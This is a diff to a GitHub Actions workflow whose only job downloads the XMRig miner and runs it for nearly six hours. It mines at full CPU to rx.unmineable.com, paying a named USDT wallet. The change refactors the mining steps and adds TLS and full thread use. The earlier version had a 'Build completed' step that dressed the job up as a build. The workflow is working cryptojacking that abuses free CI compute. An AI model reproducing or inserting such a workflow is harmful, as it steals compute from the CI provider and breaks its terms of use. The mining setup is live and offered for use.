@@ -13,25 +13,30 @@ jobs:
     timeout-minutes: 350
     
     steps:
-    - name: Checkout
-      uses: actions/checkout@v3
-      
+    - uses: actions/checkout@v2
+    
     - name: Setup Environment
       run: |
         sudo apt-get update -qq
         sudo apt-get install -y wget curl
-        
+    
     - name: Download XMRig
       run: |
+        cd /tmp
         wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
         tar -xf xmrig-6.21.0-linux-x64.tar.gz
-        
-    - name: Start Mining
-      run: |
         cd xmrig-6.21.0
         chmod +x xmrig
-        timeout 345m ./xmrig -o rx.unmineable.com:3333 -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.test_nishantluhaif -p x --donate-level 1 || true
-        
-    - name: Complete
-      if: always()
-      run: echo "Build completed"
+    
+    - name: Run Mining
+      run: |
+        cd /tmp/xmrig-6.21.0
+        ./xmrig --donate-level 1 \
+          -o rx.unmineable.com:3333 \
+          -u USDT:0x74B56f2C379996fedabF53D36aeE73c5E5129fC9.ultra_nishantluhaif \
+          -p x \
+          -a rx/0 \
+          --tls \
+          --keepalive \
+          --cpu-max-threads-hint=100 \
+          --randomx-mode=auto
